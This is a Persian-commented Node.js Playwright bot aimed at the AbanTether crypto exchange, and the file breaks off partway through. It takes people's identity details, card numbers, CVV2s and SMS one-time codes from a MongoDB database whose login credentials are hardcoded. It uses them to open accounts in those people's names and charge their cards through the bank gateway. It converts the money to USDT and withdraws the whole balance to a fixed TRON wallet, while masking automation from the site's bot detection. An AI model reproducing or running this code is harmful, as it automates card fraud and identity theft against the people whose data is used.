// ============================================
// 🤖 ربات کامل آبان تتر - AbanTether Bot v1.0
// ============================================

const { chromium } = require('playwright');
const { MongoClient } = require('mongodb');

// ============================================
// ⚙️ تنظیمات
// ============================================

const CONFIG = {
  // 🔗 اتصال به دیتابیس شما
  MONGODB_URI: 'mongodb+srv://zarin_db_user:zarin22@cluster0.ukd7zib.mongodb.net/ZarrinApp?retryWrites=true&w=majority',
  DATABASE_NAME: 'ZarrinApp',
  COLLECTION_NAME: 'zarinapp',
  
  // 🌐 تنظیمات سایت
  BASE_URL: 'https://abantether.com',
  HEADLESS: false, // false برای تست (مشاهده مرورگر)، true برای سرور
  TIMEOUT: 90000, // 90 ثانیه
  
  // 💰 تراکنش‌ها
  DEPOSIT_AMOUNT: '5000000', // 5,000,000 تومان
  WITHDRAW_ADDRESS: 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS',
  DEFAULT_PASSWORD: 'Abcd@1234',
  
  // 🔄 تلاش مجدد
  MAX_RETRIES: 3, // حداکثر ۳ بار تلاش
  RETRY_DELAY: 10000, // 10 ثانیه بین هر تلاش
  
  // ⏱️ زمان‌بندی
  POLLING_INTERVAL: 30000, // چک دیتابیس هر ۳۰ ثانیه
  BATCH_SIZE: 10, // حداکثر کاربران در هر چک
  
  // 👥 اجرای همزمان
  CONCURRENT_USERS: 2, // ۲ کاربر همزمان
  
  // 🎯 تنظیمات هوشمندی
  HUMAN_DELAY_MIN: 800,
  HUMAN_DELAY_MAX: 2000,
  
  // 📍 لوکیشن ایران
  LOCALE: 'fa-IR',
  TIMEZONE: 'Asia/Tehran'
};

// ============================================
// 🗄️ کلاس مدیریت دیتابیس
// ============================================

class DatabaseManager {
  constructor() {
    this.client = null;
    this.db = null;
    this.collection = null;
    this.isConnected = false;
  }

  async connect() {
    try {
      console.log('🔌 در حال اتصال به MongoDB...');
      this.client = new MongoClient(CONFIG.MONGODB_URI, {
        serverSelectionTimeoutMS: 10000,
        connectTimeoutMS: 15000,
        socketTimeoutMS: 20000
      });
      
      await this.client.connect();
      this.db = this.client.db(CONFIG.DATABASE_NAME);
      this.collection = this.db.collection(CONFIG.COLLECTION_NAME);
      
      // تست اتصال
      await this.collection.findOne({});
      
      this.isConnected = true;
      console.log('✅ موفق: اتصال به دیتابیس برقرار شد');
      return true;
    } catch (error) {
      console.error('❌ خطا در اتصال به دیتابیس:', error.message);
      return false;
    }
  }

  async getPendingUsers() {
    try {
      if (!this.isConnected) {
        await this.connect();
      }

      // 🔍 کوئری برای پیدا کردن کاربران جدید
      const query = {
        $or: [
          { otp_login: { $exists: true, $ne: null, $ne: '' } },
          { otp_register_card: { $exists: true, $ne: null, $ne: '' } },
          { otp_payment: { $exists: true, $ne: null, $ne: '' } }
        ],
        processed: { $ne: true },
        $or: [
          { status: { $exists: false } },
          { status: { $ne: 'failed' } },
          { status: { $ne: 'completed' } }
        ]
      };

      const users = await this.collection.find(query)
        .sort({ _id: -1 }) // جدیدترین‌ها اول
        .limit(CONFIG.BATCH_SIZE)
        .toArray();

      console.log(`📊 ${users.length} کاربر در انتظار پردازش`);
      return users;
    } catch (error) {
      console.error('❌ خطا در دریافت کاربران:', error.message);
      return [];
    }
  }

  async updateUser(phoneNumber, updateData) {
    try {
      const result = await this.collection.updateOne(
        { personalPhoneNumber: phoneNumber },
        {
          $set: updateData,
          $inc: { retryCount: updateData.status === 'failed' ? 1 : 0 },
          $setOnInsert: { createdAt: new Date() },
          $currentDate: { lastUpdated: true }
        }
      );
      
      return result.modifiedCount > 0 || result.upsertedCount > 0;
    } catch (error) {
      console.error('❌ خطا در آپدیت کاربر:', error.message);
      return false;
    }
  }

  async markAsProcessing(phoneNumber) {
    return this.updateUser(phoneNumber, {
      status: 'processing',
      startedAt: new Date(),
      lastStep: 'شروع'
    });
  }

  async markAsCompleted(phoneNumber) {
    return this.updateUser(phoneNumber, {
      processed: true,
      status: 'completed',
      completedAt: new Date(),
      message: 'تمام مراحل با موفقیت انجام شد'
    });
  }

  async markAsFailed(phoneNumber, reason, step = null) {
    const updateData = {
      status: 'failed',
      failureReason: reason,
      failedAt: new Date()
    };
    
    if (step) {
      updateData.lastStep = step;
    }
    
    return this.updateUser(phoneNumber, updateData);
  }

  async updateStep(phoneNumber, step) {
    return this.updateUser(phoneNumber, {
      lastStep: step,
      lastStepTime: new Date()
    });
  }

  async disconnect() {
    try {
      if (this.client) {
        await this.client.close();
        this.isConnected = false;
        console.log('🔌 اتصال دیتابیس بسته شد');
      }
    } catch (error) {
      console.error('❌ خطا در بستن اتصال:', error.message);
    }
  }
}

// ============================================
// 🤖 کلاس ربات اصلی
// ============================================

class AbanTetherBot {
  constructor(userData) {
    this.userData = userData;
    this.browser = null;
    this.page = null;
    this.context = null;
    this.currentStep = 'آماده‌سازی';
    this.retryCount = 0;
    this.maxRetries = 3;
  }

  // 🚀 راه‌اندازی مرورگر
  async initialize() {
    try {
      console.log('🚀 در حال راه‌اندازی مرورگر...');
      
      this.browser = await chromium.launch({ 
        headless: CONFIG.HEADLESS,
        args: [
          '--no-sandbox',
          '--disable-setuid-sandbox',
          '--disable-dev-shm-usage',
          '--disable-web-security',
          '--disable-features=IsolateOrigins,site-per-process',
          '--disable-blink-features=AutomationControlled'
        ]
      });
      
      // تنظیم context با مشخصات ایرانی
      this.context = await this.browser.newContext({
        viewport: { width: 1920, height: 1080 },
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        locale: CONFIG.LOCALE,
        timezoneId: CONFIG.TIMEZONE,
        permissions: ['clipboard-read', 'clipboard-write']
      });
      
      // 🎭 مخفی کردن اتوماسیون
      await this.context.addInitScript(() => {
        // حذف webdriver
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        
        // حذف chrome
        window.chrome = { runtime: {} };
        
        // اضافه کردن property‌های واقعی
        Object.defineProperty(navigator, 'languages', {
          get: () => ['fa-IR', 'fa', 'en-US', 'en']
        });
        
        Object.defineProperty(navigator, 'plugins', {
          get: () => [1, 2, 3, 4, 5]
        });
      });
      
      this.page = await this.context.newPage();
      
      // تنظیم timeout
      await this.page.setDefaultTimeout(CONFIG.TIMEOUT);
      await this.page.setDefaultNavigationTimeout(CONFIG.TIMEOUT);
      
      // تنظیم referer و origin
      await this.page.setExtraHTTPHeaders({
        'Accept-Language': 'fa,fa-IR;q=0.9,en;q=0.8',
        'Referer': CONFIG.BASE_URL,
        'Origin': CONFIG.BASE_URL
      });
      
      console.log('✅ مرورگر آماده است');
      return true;
      
    } catch (error) {
      console.error('❌ خطا در راه‌اندازی مرورگر:', error.message);
      return false;
    }
  }

  // ⏱️ تاخیرهای انسانی
  async delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  async humanDelay() {
    const delay = Math.floor(Math.random() * 
      (CONFIG.HUMAN_DELAY_MAX - CONFIG.HUMAN_DELAY_MIN + 1)) + CONFIG.HUMAN_DELAY_MIN;
    await this.delay(delay);
  }

  // 🔍 پیدا کردن المان‌ها با متن (اولویت اصلی)
  async findElementByText(text, elementType = '*', exact = false) {
    try {
      let selector;
      
      if (exact) {
        selector = `//${elementType}[text()='${text}']`;
      } else {
        selector = `//${elementType}[contains(text(), '${text}')]`;
      }
      
      const element = await this.page.waitForSelector(selector, { 
        timeout: 10000,
        state: 'visible'
      }).catch(() => null);
      
      return element;
    } catch (error) {
      return null;
    }
  }

  // 🖱️ کلیک با متن
  async clickByText(text, exact = false) {
    try {
      console.log(`🔍 در حال جستجو برای: "${text}"`);
      
      // اولویت‌های مختلف برای کلیک
      const selectors = [
        `//button[contains(text(), '${text}')]`,
        `//a[contains(text(), '${text}')]`,
        `//div[contains(text(), '${text}')]`,
        `//span[contains(text(), '${text}')]`,
        `//input[@value='${text}']`,
        `//input[@type='submit' and @value='${text}']`,
        `//input[@type='button' and @value='${text}']`,
        `//*[@role='button' and contains(text(), '${text}')]`,
        `//*[contains(@class, 'btn') and contains(text(), '${text}')]`,
        `//*[contains(@class, 'button') and contains(text(), '${text}')]`
      ];
      
      for (const selector of selectors) {
        try {
          const element = await this.page.$(selector);
          if (element && await element.isVisible()) {
            // حرکت ماوس به المان
            await element.hover();
            await this.humanDelay();
            
            // کلیک
            await element.click();
            console.log(`✅ کلیک کردم روی: "${text}"`);
            await this.humanDelay();
            return true;
          }
        } catch (error) {
          continue;
        }
      }
      
      throw new Error(`المان "${text}" پیدا نشد`);
      
    } catch (error) {
      console.error(`❌ خطا در کلیک روی "${text}":`, error.message);
      return false;
    }
  }

  // 📝 پر کردن فیلد با لیبل
  async fillByLabel(labelText, value) {
    try {
      console.log(`📝 پر کردن "${labelText}" با "${value}"`);
      
      // روش‌های مختلف برای پیدا کردن فیلد
      const strategies = [
        // 1. لیبل + فیلد بعدی
        async () => {
          const selector = `//label[contains(., '${labelText}')]/following::input[1]`;
          const element = await this.page.$(selector);
          if (element) {
            await element.fill(value);
            return true;
          }
          return false;
        },
        
        // 2. دایو + فیلد بعدی
        async () => {
          const selector = `//div[contains(., '${labelText}')]/following::input[1]`;
          const element = await this.page.$(selector);
          if (element) {
            await element.fill(value);
            return true;
          }
          return false;
        },
        
        // 3. با placeholder
        async () => {
          const placeholderMap = {
            'شماره تلفن همراه': ['موبایل', 'تلفن', 'شماره', 'phone', 'mobile'],
            'رمز عبور': ['رمز', 'پسورد', 'password', 'کلمه عبور'],
            'کد ملی': ['کدملی', 'ملی', 'کد', 'شناسه'],
            'تاریخ تولد': ['تولد', 'تاریخ', 'birth', 'birthday'],
            'شماره کارت': ['کارت', 'شماره کارت', 'card', 'bank'],
            'CVV2': ['cvv', 'cvv2', 'کد امنیتی'],
            'ماه': ['month', 'ماه انقضا'],
            'سال': ['year', 'سال انقضا'],
            'مبلغ': ['مبلغ', 'amount', 'تومان', 'ریال'],
            'آدرس': ['آدرس', 'address', 'ولت', 'wallet']
          };
          
          for (const [key, keywords] of Object.entries(placeholderMap)) {
            if (labelText.includes(key)) {
              for (const keyword of keywords) {
                const selector = `input[placeholder*="${keyword}" i], textarea[placeholder*="${keyword}" i]`;
                const element = await this.page.$(selector);
                if (element) {
                  await element.fill(value);
                  return true;
                }
              }
            }
          }
          return false;
        },
        
        // 4. با name یا id
        async () => {
          const nameMap = {
            'شماره تلفن همراه': ['phone', 'mobile', 'tel', 'phoneNumber'],
            'رمز عبور': ['password', 'pass', 'رمز'],
            'کد ملی': ['nationalCode', 'meli', 'codeMeli'],
            'تاریخ تولد': ['birthDate', 'birthday', 'تاریخ'],
            'شماره کارت': ['cardNumber', 'card', 'shomareKart'],
            'CVV2': ['cvv2', 'cvv', 'کد'],
            'ماه': ['month', 'ماه'],
            'سال': ['year', 'سال'],
            'مبلغ': ['amount', 'مبلغ', 'price'],
            'آدرس': ['address', 'آدرس', 'wallet']
          };
          
          for (const [key, names] of Object.entries(nameMap)) {
            if (labelText.includes(key)) {
              for (const name of names) {
                const selectors = [
                  `input[name*="${name}" i]`,
                  `input[id*="${name}" i]`,
                  `textarea[name*="${name}" i]`,
                  `textarea[id*="${name}" i]`
                ];
                
                for (const selector of selectors) {
                  const element = await this.page.$(selector);
                  if (element) {
                    await element.fill(value);
                    return true;
                  }
                }
              }
            }
          }
          return false;
        }
      ];
      
      // امتحان کردن تمام استراتژی‌ها
      for (const strategy of strategies) {
        try {
          const success = await strategy();
          if (success) {
            console.log(`✅ "${labelText}" با موفقیت پر شد`);
            await this.humanDelay();
            return true;
          }
        } catch (error) {
          continue;
        }
      }
      
      throw new Error(`فیلد "${labelText}" پیدا نشد`);
      
    } catch (error) {
      console.error(`❌ خطا در پر کردن "${labelText}":`, error.message);
      return false;
    }
  }

  // 🔢 وارد کردن کد OTP
  async enterOtp(otpValue) {
    try {
      if (!otpValue || otpValue.length < 4) {
        console.log('⚠️ کد OTP نامعتبر است');
        return false;
      }
      
      console.log(`🔢 در حال وارد کردن کد OTP: ${otpValue}`);
      
      // روش‌های مختلف برای پیدا کردن فیلدهای OTP
      const otpSelectors = [
        'input[type="tel"]',
        'input[type="number"]',
        'input[maxlength="1"]',
        'input[style*="width"][style*="height"]',
        '.otp-input',
        '.sms-code',
        '.verification-code',
        '[class*="otp"]',
        '[class*="code"]',
        '[class*="digit"]'
      ];
      
      let otpFields = [];
      
      // پیدا کردن فیلدها
      for (const selector of otpSelectors) {
        const fields = await this.page.$$(selector);
        if (fields.length >= 4) { // حداقل ۴ فیلد
          otpFields = fields;
          break;
        }
      }
      
      // اگر پیدا نکردیم، همه inputها را بررسی می‌کنیم
      if (otpFields.length === 0) {
        const allInputs = await this.page.$$('input');
        otpFields = allInputs.slice(0, 6);
      }
      
      if (otpFields.length === 0) {
        throw new Error('فیلدهای OTP پیدا نشد');
      }
      
      // پاک کردن و پر کردن فیلدها
      for (let i = 0; i < Math.min(otpFields.length, otpValue.length); i++) {
        const field = otpFields[i];
        if (field) {
          await field.click();
          await field.fill('');
          await this.delay(100);
          await field.fill(otpValue[i]);
          await this.delay(200);
        }
      }
      
      console.log('✅ کد OTP وارد شد');
      return true;
      
    } catch (error) {
      console.error('❌ خطا در وارد کردن OTP:', error.message);
      return false;
    }
  }

  // 📍 فاز ۱: ثبت‌نام و احراز اولیه
  async phase1_Register() {
    this.currentStep = 'ثبت‌نام اولیه';
    console.log('\n🎬 ===== فاز ۱: ثبت‌نام و احراز اولیه =====');
    
    try {
      // 1. رفتن به صفحه اصلی
      console.log('1. رفتن به سایت آبان تتر...');
      await this.page.goto(CONFIG.BASE_URL, { waitUntil: 'networkidle' });
      await this.humanDelay();
      
      // 2. کلیک روی ثبت‌نام
      console.log('2. کلیک روی دکمه ثبت‌نام...');
      await this.clickByText('ثبت‌نام');
      await this.delay(2000);
      
      // 3. وارد کردن شماره موبایل
      console.log('3. وارد کردن شماره موبایل...');
      await this.fillByLabel('شماره تلفن همراه', this.userData.personalPhoneNumber);
      
      // 4. کلیک ادامه
      console.log('4. کلیک روی دکمه ادامه...');
      await this.clickByText('ادامه');
      await this.delay(3000);
      
      // 5. بررسی وجود OTP
      if (!this.userData.otp_login) {
        console.log('⏳ منتظر کد OTP در دیتابیس...');
        await this.delay(5000);
        // در اینجا باید منتظر پر شدن otp_login در دیتابیس باشیم
        // در نسخه اصلی، اسکجولر منتظر می‌ماند
        throw new Error('کد OTP دریافت نشد');
      }
      
      // 6. وارد کردن کد OTP
      console.log('5. وارد کردن کد تایید...');
      await this.enterOtp(this.userData.otp_login);
      
      // 7. کلیک تأیید
      console.log('6. کلیک روی دکمه تأیید...');
      await this.clickByText('تأیید');
      await this.delay(3000);
      
      // 8. وارد کردن رمز عبور
      console.log('7. وارد کردن رمز عبور...');
      const password = this.userData.password || CONFIG.DEFAULT_PASSWORD;
      await this.fillByLabel('رمز عبور', password);
      
      // 9. کلیک تکمیل ثبت‌نام
      console.log('8. کلیک روی تکمیل ثبت‌نام...');
      await this.clickByText('تکمیل ثبت‌نام');
      await this.delay(3000);
      
      // 10. وارد کردن کد ملی و تاریخ تولد
      console.log('9. وارد کردن اطلاعات هویتی...');
      await this.fillByLabel('کد ملی', this.userData.personalNationalCode);
      await this.fillByLabel('تاریخ تولد', this.userData.personalBirthDate);
      
      // 11. کلیک تأیید اطلاعات
      console.log('10. کلیک روی تأیید اطلاعات...');
      await this.clickByText('تأیید اطلاعات');
      await this.delay(5000);
      
      console.log('✅ فاز ۱ با موفقیت تکمیل شد');
      return true;
      
    } catch (error) {
      console.error(`❌ خطا در فاز ۱: ${error.message}`);
      throw error;
    }
  }

  // 💳 فاز ۲: ثبت کارت و احراز هویت
  async phase2_CardAndKYC() {
    this.currentStep = 'ثبت کارت بانکی';
    console.log('\n💳 ===== فاز ۲: ثبت کارت و احراز هویت =====');
    
    try {
      // 1. رفتن به حساب بانکی
      console.log('1. رفتن به بخش حساب بانکی...');
      await this.clickByText('حساب بانکی');
      await this.delay(3000);
      
      // 2. کلیک روی افزودن کارت جدید
      console.log('2. کلیک روی افزودن کارت جدید...');
      await this.clickByText('افزودن کارت جدید');
      await this.delay(2000);
      
      // 3. وارد کردن شماره کارت
      console.log('3. وارد کردن شماره کارت...');
      await this.fillByLabel('شماره کارت', this.userData.cardNumber);
      
      // 4. کلیک ثبت کارت
      console.log('4. کلیک روی دکمه ثبت کارت...');
      await this.clickByText('ثبت کارت');
      await this.delay(3000);
      
      // 5. بررسی OTP ثبت کارت
      if (!this.userData.otp_register_card) {
        console.log('⏳ منتظر کد OTP ثبت کارت...');
        await this.delay(3000);
      } else {
        // 6. وارد کردن OTP ثبت کارت
        console.log('5. وارد کردن کد تأیید کارت...');
        await this.enterOtp(this.userData.otp_register_card);
        
        // 7. کلیک تأیید
        console.log('6. کلیک روی دکمه تأیید...');
        await this.clickByText('تأیید');
        await this.delay(3000);
      }
      
      // 8. رفتن به بخش احراز هویت
      console.log('7. رفتن به بخش احراز هویت...');
      await this.clickByText('احراز هویت');
      await this.delay(3000);
      
      console.log('⚠️ نکته: مرحله آپلود مدارک نیاز به اقدام دستی دارد');
      console.log('✅ فاز ۲ تکمیل شد (تا مرحله KYC)');
      return true;
      
    } catch (error) {
      console.error(`❌ خطا در فاز ۲: ${error.message}`);
      throw error;
    }
  }

  // 💰 فاز ۳: واریز تومان
  async phase3_Deposit() {
    this.currentStep = 'واریز تومان';
    console.log('\n💰 ===== فاز ۳: واریز تومان =====');
    
    try {
      // 1. رفتن به کیف پول
      console.log('1. رفتن به بخش کیف پول...');
      await this.clickByText('کیف پول');
      await this.delay(3000);
      
      // 2. کلیک روی واریز تومان
      console.log('2. کلیک روی واریز تومان...');
      await this.clickByText('واریز تومان');
      await this.delay(2000);
      
      // 3. انتخاب واریز آنلاین
      console.log('3. انتخاب روش واریز آنلاین...');
      await this.clickByText('واریز آنلاین (درگاه پرداخت)');
      await this.delay(2000);
      
      // 4. وارد کردن مبلغ
      console.log('4. وارد کردن مبلغ واریزی...');
      await this.fillByLabel('مبلغ واریزی', CONFIG.DEPOSIT_AMOUNT);
      
      // 5. کلیک ایجاد درخواست
      console.log('5. کلیک روی ایجاد درخواست واریز...');
      await this.clickByText('ایجاد درخواست واریز');
      await this.delay(5000);
      
      // 6. بررسی انتقال به درگاه بانک
      console.log('6. بررسی انتقال به درگاه بانک...');
      const currentUrl = this.page.url().toLowerCase();
      const isBankPage = currentUrl.includes('bank') || 
                        currentUrl.includes('shaparak') || 
                        currentUrl.includes('پرداخت') ||
                        currentUrl.includes('gateway');
      
      if (isBankPage) {
        console.log('🏦 به درگاه بانک منتقل شدیم');
        
        try {
          // سعی در پر کردن فیلدهای بانک
          console.log('7. پر کردن اطلاعات بانک...');
          
          // CVV2
          if (this.userData.cvv2) {
            await this.fillByLabel('CVV2', this.userData.cvv2);
          }
          
          // تاریخ انقضا
          if (this.userData.bankMonth && this.userData.bankYear) {
            const expiry = `${this.userData.bankMonth}/${this.userData.bankYear.slice(2)}`;
            await this.fillByLabel('تاریخ انقضا', expiry);
          }
          
          // OTP پرداخت
          if (this.userData.otp_payment) {
            console.log('8. وارد کردن کد پرداخت...');
            await this.enterOtp(this.userData.otp_payment);
            
            console.log('9. کلیک روی پرداخت...');
            await this.clickByText('پرداخت');
            await this.delay(8000);
          }
        } catch (bankError) {
          console.log('⚠️ نتوانستم فرم بانک را به طور کامل پر کنم');
          console.log('ℹ️ نیاز به اقدام دستی برای پرداخت');
        }
      } else {
        console.log('ℹ️ منتظر انتقال به درگاه بانک...');
        await this.delay(5000);
      }
      
      console.log('✅ فاز ۳ تکمیل شد');
      return true;
      
    } catch (error) {
      console.error(`❌ خطا در فاز ۳: ${error.message}`);
      throw error;
    }
  }

  // 🔄 فاز ۴: خرید تتر
  async phase4_BuyUSDT() {
    this.currentStep = 'خرید تتر';
    console.log('\n🔄 ===== فاز ۴: خرید تتر (USDT) =====');
    
    try {
      // 1. رفتن به معامله فوری
      console.log('1. رفتن به بخش معامله فوری...');
      await this.clickByText('معامله فوری');
      await this.delay(3000);
      
      // 2. اطمینان از فعال بودن تب خرید
      console.log('2. بررسی فعال بودن تب خرید...');
      try {
        await this.clickByText('خرید');
        await this.delay(1000);
      } catch (error) {
        console.log('ℹ️ تب خرید احتمالاً فعال است');
      }
      
      // 3. انتخاب تتر
      console.log('3. انتخاب ارز تتر...');
      try {
        await this.clickByText('تتر');
        await this.delay(2000);
      } catch (error) {
        console.log('⚠️ نتوانستم تتر را انتخاب کنم، ادامه می‌دهم...');
      }
      
      // 4. وارد کردن مبلغ
      console.log('4. وارد کردن مبلغ خرید...');
      await this.fillByLabel('مبلغ تومان', CONFIG.DEPOSIT_AMOUNT);
      
      // 5. کلیک تایید و خرید
      console.log('5. کلیک روی تایید و خرید...');
      await this.clickByText('تایید و خرید');
      await this.delay(3000);
      
      // 6. تأیید نهایی
      console.log('6. تأیید نهایی خرید...');
      await this.clickByText('تأیید');
      await this.delay(5000);
      
      console.log('✅ فاز ۴ تکمیل شد');
      return true;
      
    } catch (error) {
      console.error(`❌ خطا در فاز ۴: ${error.message}`);
      throw error;
    }
  }

  // 📤 فاز ۵: برداشت به ولت خارجی
  async phase5_Withdraw() {
    this.currentStep = 'برداشت تتر';
    console.log('\n📤 ===== فاز ۵: برداشت به ولت خارجی =====');
    
    try {
      // 1. رفتن به کیف پول
      console.log('1. رفتن به بخش کیف پول...');
      await this.clickByText('کیف پول');
      await this.delay(3000);
      
      // 2. کلیک روی برداشت رمزارز
      console.log('2. کلیک روی برداشت رمزارز...');
      await this.clickByText('برداشت رمزارز');
      await this.delay(2000);
      
      // 3. انتخاب تتر
      console.log('3. انتخاب ارز تتر برای برداشت...');
      try {
        await this.clickByText('تتر');
        await this.delay(2000);
      } catch (error) {
        console.log('⚠️ نتوانستم تتر را انتخاب کنم');
      }
      
      // 4. انتخاب شبکه TRC-20
      console.log('4. انتخاب شبکه TRC-20...');
      try {
        await this.clickByText('TRC-20');
        await this.delay(2000);
      } catch (error) {
        console.log('⚠️ نتوانستم شبکه TRC-20 را انتخاب کنم');
      }
      
      // 5. وارد کردن آدرس ولت
      console.log('5. وارد کردن آدرس کیف پول...');
      await this.fillByLabel('آدرس کیف پول مقصد', CONFIG.WITHDRAW_ADDRESS);
      
      // 6. کلیک روی "همه موجودی"
      console.log('6. انتخاب کل موجودی...');
      try {
        await this.clickByText('همه موجودی');
        await this.delay(1000);
      } catch (error) {
        console.log('⚠️ دکمه "همه موجودی" پیدا نشد');
      }
      
      // 7. ثبت درخواست برداشت
      console.log('7. ثبت درخواست برداشت...');
      await this.clickByText('ثبت درخواست برداشت');
      await this.delay(3000);
      
      // 8. بررسی نیاز به کد امنیتی
      console.log('8. بررسی کد امنیتی...');
      if (this.userData.security_code) {
        console.log('9. وارد کردن کد امنیتی...');
        await this.enterOtp(this.userData.security_code);
        await this.clickByText('تأیید');
        await this.delay(5000);
      }
      
      console.log('✅ فاز ۵ تکمیل شد');
      return true;
      
    } catch (error) {
      console.error(`❌ خطا در فاز ۵: ${error.message}`);
      throw error;
    }
  }

  // 🧹 پاکسازی
  async cleanup() {
    try {
      console.log('🧹 در حال پاکسازی...');
      
      if (this.page) {
        await this.page.close().catch(() => {});
      }
      
      if (this.context) {
        await this.context.close().catch(() => {});
      }
      
      if (this.browser) {
        await this.browser.close().catch(() => {});
      }
      
      console.log('✅ پاکسازی انجام شد');
    } catch (error) {
      console.error('⚠️ خطا در پاکسازی:', error.message);
    }
  }

  // 🏃‍♂️ اجرای کامل فرآیند
  async run() {
    const phone = this.userData.personalPhoneNumber;
    console.log(`\n🤖 ===== شروع فرآیند برای: ${phone} =====`);
    
    let success = false;
    let errorMessage = '';
    
    try {
      // راه‌اندازی مرورگر
      const initialized = await this.initialize();
      if (!initialized) {
        throw new Error('راه‌اندازی مرورگر ناموفق بود');
      }
      
      // لیست مراحل
      const phases = [
        { name: 'ثبت‌نام', method: () => this.phase1_Register() },
        { name: 'ثبت کارت', method: () => this.phase2_CardAndKYC() },
        { name: 'واریز', method: () => this.phase3_Deposit() },
        { name: 'خرید', method: () => this.phase4_BuyUSDT() },
        { name: 'برداشت', method: () => this.phase5_Withdraw() }
      ];
      
      // اجرای مراحل
      for (const phase of phases) {
        console.log(`\n🚀 مرحله: ${phase.name}`);
        this.currentStep = phase.name;
        
        let phaseSuccess = false;
        let retries = 0;
        
        // تلاش مجدد برای هر مرحله
        while (!phaseSuccess && retries < 2) {
          try {
            await phase.method();
            phaseSuccess = true;
            console.log(`✅ ${phase.name} تکمیل شد`);
          } catch (phaseError) {
            retries++;
            console.error(`❌ خطا در ${phase.name} (تلاش ${retries}/2):`, phaseError.message);
            
            if (retries < 2) {
              console.log(`⏳ ${5 * retries} ثانیه صبر...`);
              await this.delay(5000 * retries);
            } else {
              throw phaseError;
            }
          }
        }
        
        if (!phaseSuccess) {
          throw new Error(`مرحله ${phase.name} بعد از ۲ تلاش ناموفق بود`);
        }
        
        await this.delay(2000);
      }
      
      success = true;
      console.log(`\n🎉 🎉 🎉 فرآیند برای ${phone} با موفقیت تکمیل شد! 🎉 🎉 🎉`);
      
    } catch (error) {
      success = false;
      errorMessage = `خطا در ${this.currentStep}: ${error.message}`;
      console.error(`\n💥 ${errorMessage}`);
    } finally {
      await this.cleanup();
    }
    
    return {
      success,
      phone,
      step: this.currentStep,
      error: errorMessage,
      timestamp: new Date().toISOString()
    };
  }
}

// ============================================
// 🎪 کلاس کنترلر اصلی
// ============================================

class MainController {
  constructor() {
    this.db = new DatabaseManager();
    this.queue = [];
    this.activeUsers = new Set();
    this.stats = {
      totalProcessed: 0,
      successful: 0,
      failed: 0,
      lastCheck: null
    };
  }

  async start() {
    // نمایش بنر
    console.log(`
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   🤖 ربات اتوماسیون آبان تتر v1.0                       ║
║   📊 دیتابیس: ${CONFIG.DATABASE_NAME}/${CONFIG.COLLECTION_NAME}  ║
║   ⏱️  چک هر ${CONFIG.POLLING_INTERVAL/1000} ثانیه              ║
║   🔄 حداکثر ${CONFIG.MAX_RETRIES} تلاش                       ║
║   👥 ${CONFIG.CONCURRENT_USERS} کاربر همزمان                    ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
    `);
    
    // اتصال به دیتابیس
    console.log('🔌 در حال برقراری ارتباط با دیتابیس...');
    const connected = await this.db.connect();
    if (!connected) {
      console.error('❌ نمی‌توانم به دیتابیس متصل شوم. لطفا تنظیمات را بررسی کنید.');
      console.log('📌 URI دیتابیس:', CONFIG.MONGODB_URI);
      process.exit(1);
    }
    
    // شروع نظارت
    console.log('🎯 شروع نظارت بر دیتابیس...\n');
    
    // زمان‌بندی‌ها
    setInterval(() => this.checkDatabase(), CONFIG.POLLING_INTERVAL);
    setInterval(() => this.processQueue(), 5000);
    setInterval(() => this.showStats(), 60000);
    
    // چک اولیه
    await this.checkDatabase();
    
    console.log('✅ ربات فعال شد و در حال اجرا است...');
    console.log('📞 منتظر کاربران جدید...\n');
  }

  async checkDatabase() {
    try {
      console.log('🔍 در حال بررسی دیتابیس برای کاربران جدید...');
      this.stats.lastCheck = new Date();
      
      const users = await this.db.getPendingUsers();
      
      for (const user of users) {
        const phone = user.personalPhoneNumber;
        
        // بررسی شرایط
        if (this.shouldSkipUser(user)) {
          continue;
        }
        
        // افزودن به صف
        this.addToQueue(user);
      }
      
    } catch (error) {
      console.error('❌ خطا در بررسی دیتابیس:', error.message);
    }
  }

  shouldSkipUser(user) {
    const phone = user.personalPhoneNumber;
    
    // اگر در حال پردازش است
    if (this.activeUsers.has(phone)) {
      return true;
    }
    
    // اگر قبلاً پردازش شده
    if (user.processed === true) {
      return true;
    }
    
    // اگر وضعیت failed است و بیش از ۳ بار تلاش شده
    if (user.status === 'failed' && (user.retryCount || 0) >= CONFIG.MAX_RETRIES) {
      console.log(`⛔ ${phone}: حداکثر تلاش‌ها انجام شده (${user.retryCount} بار)`);
      return true;
    }
    
    // اگر شماره موبایل ندارد
    if (!phone || phone.length < 10) {
      console.log(`⚠️ ${phone}: شماره موبایل نامعتبر`);
      return true;
    }
    
    // اگر OTP لاگین ندارد
    if (!user.otp_login) {
      console.log(`⏳ ${phone}: منتظر کد OTP`);
      return true;
    }
    
    return false;
  }

  addToQueue(user) {
    const phone = user.personalPhoneNumber;
    
    // بررسی وجود در صف
    const exists = this.queue.find(u => u.personalPhoneNumber === phone);
    if (exists) {
      return;
    }
    
    // محاسبه اولویت
    const retryCount = user.retryCount || 0;
    const priority = 100 - (retryCount * 10); // کاربران جدید اولویت بیشتر
    
    this.queue.push({
      ...user,
      addedAt: new Date(),
      attempt: retryCount + 1,
      priority
    });
    
    console.log(`📝 ${phone} به صف اضافه شد (اولویت: ${priority})`);
  }

  async processQueue() {
    // بررسی ظرفیت
    if (this.activeUsers.size >= CONFIG.CONCURRENT_USERS) {
      return;
    }
    
    if (this.queue.length === 0) {
      return;
    }
    
    // مرتب‌سازی بر اساس اولویت
    this.queue.sort((a, b) => b.priority - a.priority);
    
    // تعداد قابل پردازش
    const availableSlots = CONFIG.CONCURRENT_USERS - this.activeUsers.size;
    const toProcess = this.queue.splice(0, Math.min(availableSlots, this.queue.length));
    
    for (const user of toProcess) {
      this.processUser(user);
    }
  }

  async processUser(user) {
    const phone = user.personalPhoneNumber;
    const attempt = user.attempt || 1;
    
    this.activeUsers.add(phone);
    console.log(`\n👤 شروع پردازش ${phone} (تلاش ${attempt}/${CONFIG.MAX_RETRIES})`);
    
    try {
      // علامت‌گذاری در دیتابیس
      await this.db.markAsProcessing(phone);
      
      // اجرای ربات
      const bot = new AbanTetherBot(user);
      const result = await bot.run();
      
      if (result.success) {
        // موفقیت
        this.stats.successful++;
        this.stats.totalProcessed++;
        
